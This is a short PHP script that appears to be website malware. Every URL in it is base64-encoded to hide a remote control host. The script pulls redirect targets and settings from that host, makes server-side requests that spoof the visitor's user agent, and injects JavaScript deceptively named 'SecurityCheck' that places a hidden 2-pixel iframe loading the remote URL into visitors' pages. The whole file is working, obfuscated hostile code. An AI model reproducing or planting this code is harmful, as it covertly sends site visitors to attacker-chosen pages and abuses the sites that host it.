<?php
$getSettings=file_get_contents(base64_decode("aHR0cDovL3d3dy5hdXRvLWltLmNvbS9ib251cw=="));
if(preg_match("/<div id=\"source[0-9]\">(http\:\/\/[\w \\ \. \/ \- \_ \? \" \' \: \&]+)<\/div>/",$getSettings,$toGoUrl)){
	$toGoUrl=$toGoUrl[1];
	}else{
		$toGoUrl=base64_decode("aHR0cDovL3d3dy5hdXRvLWltLmNvbS9yZQ==");
		};		
if(preg_match("/<div id=\"met_opt\">([\d])<\/div>/",$getSettings,$metaOpt)){
	$serviceSettings=$metaOpt[1];
	}else{
		$serviceSettings=1;
		};
function runCurl(){
$services=get_loaded_extensions();
if(array_search("curl",$services)){
	$getSource=curl_init();
		curl_setopt($getSource, CURLOPT_URL,base64_decode("aHR0cDovL2JvbnVzLmF1dG8taW0uY29t"));
		curl_setopt($getSource, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($getSource, CURLOPT_AUTOREFERER,true);
		$source=curl_exec($getSource);
	curl_close($getSource);
	if(preg_match_all(base64_decode("L2RpdlxzaWQ9Wyd8Il1zb3VyY2VbMC05XXsxLDEwfVsnfCJdPihbXHcuOlwtX1wvXEBdKyk8XC9kaXYv"),$source,$url)){
		$sa42pi09=$url[1][0];
		}else{
			$sa42pi09=base64_decode("aHR0cDovL3d3dy5hdXRvLWltLmNvbS9yZQ==");
			}
		
	$runServ=curl_init();
		curl_setopt($runServ, CURLOPT_URL,$sa42pi09);
		curl_setopt($runServ, CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($runServ, CURLOPT_AUTOREFERER,true);
		curl_setopt($runServ, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
		curl_setopt($runServ, CURLOPT_RETURNTRANSFER,1);
		$getResult=curl_exec($runServ);
	curl_close($runServ);
	};};
function runFrame($newurl){
echo base64_decode("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmZ1bmN0aW9uIFNlY3VyaXR5Q2hlY2soaWZyYW1lSUQsIHVybCkgeyBkaXZlbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2RpdmVsLmlkID0gImRpdiIgKyBpZnJhbWVJRDtkaXZlbC5zdHlsZS53aWR0aCA9ICIycHgiOyBkaXZlbC5zdHlsZS5oZWlnaHQgPSAiMnB4IjtkaXZlbC5zdHlsZS52aXNpYmlsaXR5ID0gImhpZGRlbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaXZlbCk7ZG9taWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7ZG9taWZyYW1lLmlkID0gaWZyYW1lSUQ7ZG9taWZyYW1lLnNyYyA9IHVybDtkb21pZnJhbWUuc3R5bGUud2lkdGggPSAiMnB4Ijtkb21pZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjJweCI7dmFyIGRpdmlkID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRpdiIgKyBpZnJhbWVJRCk7ZGl2aWQuYXBwZW5kQ2hpbGQoZG9taWZyYW1lKTt9Ow==")."SecurityCheck('ID1', '".$newurl."');</script>";};

?>